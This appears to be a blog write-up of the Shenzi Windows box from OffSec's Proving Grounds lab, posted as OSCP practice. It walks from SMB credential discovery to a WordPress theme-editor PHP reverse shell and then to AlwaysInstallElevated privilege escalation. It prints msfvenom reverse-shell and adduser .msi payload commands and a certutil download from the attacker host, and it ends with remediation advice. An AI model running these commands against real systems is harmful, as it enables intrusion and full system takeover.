---
layout: writeup
title: Shenzi - Proving Grounds
date: 2024-09-07 13:32:20 +0300
description: A Writeup of the Shenzi Box from Proving Grounds
image: # /assets/images/Shenzi/Shenzi1.png
fig-caption: # Add figcaption (optional)
tags: [Windows, TJ Null, LainKusanagi, AlwaysInstallElevated, .msi]
---

Today I'm doing a writeup for a [Proving Grounds](https://www.offsec.com/labs/) box from both TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)and LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called Jacko, and it is rated Intermediate by Proving Grounds and Hard by the community. As usual, we get started with an nmap (`sudo nmap -A -sC -v -p- --open 192.168.229.55 -oN nmap`) which (gives more detail but) shows these open ports:

```
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5040/tcp  open  unknown
7680/tcp  open  pando-pub
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

Before jumping into the web ports, I check for anonymous login on FTP and SMB. I can't authenticate to FTP, but I can use the SMB share `Shenzi` and find some goodies. 
![Shenzi1.png](/assets/images/Shenzi/Shenzi1.png){: .responsive-image}

The passwords.txt file contains these lines:
```
5) WordPress:

   User: admin
   Password: FeltHeadwallWight357
```

That could be something. The passwords.txt file also says the creds for the MySQL service are `root: `, but I think that's default. Plus I can't use it to log in remotely. I then see this in the readme_en.txt file:

```
4) WEBDAV:

   User: xampp-dav-unsecure
   Password: ppmax2011
```

I'm not sure if that's a default setting, but it's something to keep an eye on. I google the contents of the why.tmp file, and it looks like this is in a default file in the `xampp\tmp\` directory for `xampp`, which could be good information. 

At that point I check the web ports, particularly 80 and 443. Both show the default page for XAMPP (though only when requesting `https://$IP`, simply appending `:443` shows an error page.) 
![Shenzi2.png](/assets/images/Shenzi/Shenzi2.png){: .responsive-image}

I run a directory search on both ports, but I don't find much. Clicking around I find the `/dashboard/phpinfo.php` page which shows that the user is `shenzi`. I don't see much else in this page, but maybe I can do something with the creds I found, potentially even substituting `shenzi` for `admin` if I can't get anything for `admin`. 

![Shenzi3.png](/assets/images/Shenzi/Shenzi3.png){: .responsive-image}

I can't find anything with the creds, so I go back over all of the ports and attempt to find something I miss, but I can't. At that point I try to brute force directories again, keeping in mind that there should be some kind of wordpress service, because we did clearly find evidence of it in the passwords.txt file. The key here is to try `/shenzi` as a directory. We won't find any evidence of this, but that's the next step. It's important to keep in mind that these lab boxes *are* exploitable, so if we can't find anything, it may be time to guess something relatively easy. 

![Shenzi4.png](/assets/images/Shenzi/Shenzi4.png){: .responsive-image}

We can visit the login page at `http://192.168.239.55/shenzi/wp-login` and log in with the found credentials of `admin:http://192.168.239.55/shenzi/wp-login`. There are a few different paths to take at this point, but one of the simplest is to go to Appearance -> Theme Editor -> 404 Template and change it to a PHP reverse shell like so:
![Shenzi5.png](/assets/images/Shenzi/Shenzi5.png){: .responsive-image}

I am using the Ivan Sincek shell which is available from [revshells](revshells.com). After that we can simply set up a listener on the appropriate port and visit `http://192.168.239.55/shenzi/wp-admin/404.php` in the browser. I used port 445.

![Shenzi6.png](/assets/images/Shenzi/Shenzi6.png){: .responsive-image}

And we have a shell for the `shenzi` user. After that I grab local.txt from the user's Desktop, check for privileges with `whoami /priv`(nothing), and download then execute winpeas. One thing that jumps out quickly is the `Checking AlwaysInstallElevated` section which says that permission is set to 1 in both HKLM and HKCU. 

![Shenzi7.png](/assets/images/Shenzi/Shenzi7.png){: .responsive-image}

Per [hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) "If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) `*.msi` files as `NT AUTHORITY\SYSTEM`". Fortunately, we can create a .msi file using msfvenom, transfer it to the target machine using `certutil`, and execute it (after starting a listener). 
- From kali - `msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.240 lport=443 -f msi > shell443.msi`
- From target - `certutil -f -split -urlcache http://192.168.45.240/shell443.msi`
- From target - `.\shell443.msi`

![Shenzi8.png](/assets/images/Shenzi/Shenzi8.png){: .responsive-image}

And we catch the shell with the `nt authority\system` shell and are able to check the proof.txt file on the Administrator Desktop. Simple as. 

### Lessons Learned
It's a pretty simple box. Really the only two things to take note of here are:
- Make sure to use names you find to guess with. This one was a bit annoying because I feel like it's probably not all that realistic. It's a bit CTF-y to have a hidden wordpress site within a directory, especially one we have no other references to. I guess we did find creds that were explicitly for a wordpress site. Idk. I suspect this is the only reason that the Proving Grounds community rated this Hard instead of Easy. 
- When you have the appropriate `AlwaysInstallElevated` permissions, you can use a .msi file to your advantage. I used a reverse shell, but there are other possibilities such as using it to create a new user. This is explicitly called out on the linked [hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) page, and it looks like this: `msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi` for example. 

### Remediation Steps
- Get the password file off of the SMB server. It shouldn't be in plaintext anywhere, but it certainly shouldn't be publicly accessible. 
- The SMB server should require authentication. 
- Disable the AlwaysInstallElevate permissions for the shenzi user. Maybe there could be a reason for this, but it shouldn't be available for a user hosting the wordpress site. 